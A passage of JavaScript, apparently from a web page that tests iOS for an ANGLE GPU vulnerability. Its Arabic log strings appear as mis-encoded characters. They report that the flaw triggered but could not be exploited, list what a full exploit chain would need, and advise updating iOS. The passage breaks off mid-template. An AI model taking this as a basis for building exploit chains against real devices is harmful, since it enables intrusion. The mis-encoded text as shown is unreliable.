                logTruth('âœ“ Ø«ØºØ±Ø© ANGLE ØªÙ… ØªÙØ¹ÙŠÙ„Ù‡Ø§ ÙÙŠ GPU process');
                logTruth('âœ— Ù„ÙƒÙ† Ù„Ø§ ÙŠÙ…ÙƒÙ†Ù†Ø§ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù†ØªØ§Ø¦Ø¬Ù‡Ø§ Ù…Ù† JavaScript');
                logTruth('âœ— Ù†Ø­ØªØ§Ø¬ exploit kernel Ø¥Ø¶Ø§ÙÙŠ Ù„Ù„Ø§Ø³ØªÙØ§Ø¯Ø© Ù…Ù†Ù‡Ø§');
            }
            
            log('', 'info');
            log('=== Ø§Ù„ÙØ±Ù‚ Ø¨ÙŠÙ† PoC Ùˆ Exploit Ø­Ù‚ÙŠÙ‚ÙŠ ===', 'truth');
            logTruth('PoC (Ù…Ø§ Ø¹Ù†Ø¯Ù†Ø§): ÙŠØ«Ø¨Øª ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø«ØºØ±Ø© ÙÙ‚Ø·');
            logTruth('Real Exploit: ÙŠØ³ØªØ·ÙŠØ¹ ØªÙ†ÙÙŠØ° ÙƒÙˆØ¯ + Ø³Ø±Ù‚Ø© Ø¨ÙŠØ§Ù†Ø§Øª + Ø§Ù„Ù‡Ø±ÙˆØ¨ Ù…Ù† sandbox');
            logTruth('Ø§Ù„ÙØ±Ù‚ Ø¶Ø®Ù…! Ù…Ø«Ù„ Ø§Ù„ÙØ±Ù‚ Ø¨ÙŠÙ† Ù…Ø¹Ø±ÙØ© Ø£Ù† Ø§Ù„Ø¨Ø§Ø¨ Ù…ÙƒØ³ÙˆØ± ÙˆØ¨ÙŠÙ† ÙØªØ­Ù‡ ÙØ¹Ù„Ø§Ù‹');
            
            log('', 'info');
            log('=== ØªÙˆØµÙŠØ§Øª Ø§Ù„Ø­Ù…Ø§ÙŠØ© ===', 'success');
            log('âœ“ Ø­Ø¯Ù‘Ø« iOS Ù„Ù„Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ø£Ø­Ø¯Ø« ÙÙˆØ±Ø§Ù‹', 'success');
            log('âœ“ Ø§Ù„Ø«ØºØ±Ø§Øª Ù…ÙØµÙ„Ø­Ø© ÙÙŠ Ø§Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ø£Ø®ÙŠØ±Ø©', 'success');
            log('âœ“ Ø­ØªÙ‰ Ù„Ùˆ Ù„Ù… Ù†Ø³ØªØ·Ø¹ Ø§Ø³ØªØºÙ„Ø§Ù„Ù‡Ø§ØŒ Ù‚Ø¯ ÙŠØ³ØªØ·ÙŠØ¹ Ù…Ø­ØªØ±ÙÙˆÙ†', 'warning');
            
            resultSummary.style.display = 'block';
            summaryContent.innerHTML = `
                <div class="result-item">
                    <span>ğŸ¯ Ø§Ù„Ù†Ø¸Ø§Ù… Ø¹Ø±Ø¶Ø© Ù„Ù„Ø«ØºØ±Ø©</span>
                    <span class="${testResults.systemVulnerable ? 'status-true' : 'status-false'}">
                        ${testResults.systemVulnerable ? 'âœ“ Ù†Ø¹Ù…' : 'âœ— Ù„Ø§'}
                    </span>
                </div>
                <div class="result-item">
                    <span>ğŸ” Ø§Ø³ØªØºÙ„Ø§Ù„ Ù†Ø§Ø¬Ø­</span>
                    <span class="status-false">âœ— ÙØ´Ù„</span>
                </div>
                <div class="result
